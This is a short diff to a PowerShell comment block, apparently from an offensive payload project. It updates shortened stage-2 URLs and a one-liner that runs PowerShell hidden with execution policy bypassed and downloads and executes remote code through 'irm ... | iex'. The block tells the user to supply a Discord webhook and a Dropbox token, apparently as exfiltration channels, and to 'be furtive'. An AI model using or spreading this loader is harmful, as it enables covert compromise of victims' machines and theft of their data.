@@ -1,8 +1,8 @@
 <# 
 
 Execute command having a max caracters to put into, I need to shorten the links for the command to be as short as possible.
-Stage2 url : 
-                    https://shorturl.at/fiZ38
+THIS Stage2 url : 
+                    https://shorturl.at/lABHY
 
 
 Need to modify the invoke command to fit your needs : 
@@ -10,7 +10,7 @@ Need to modify the invoke command to fit your needs :
  	-Put your dropbox webhook into $db=''
 
 Invoke powershell + stage 2 into it + be furtive : 
-powershell -w h -NoP -Ep Bypass $dc='';$db='';irm https://shorturl.at/qNWZ6 | iex
+powershell -w h -NoP -Ep Bypass $dc='';$db='';irm https://shorturl.at/lABHY | iex
 
 
 #>
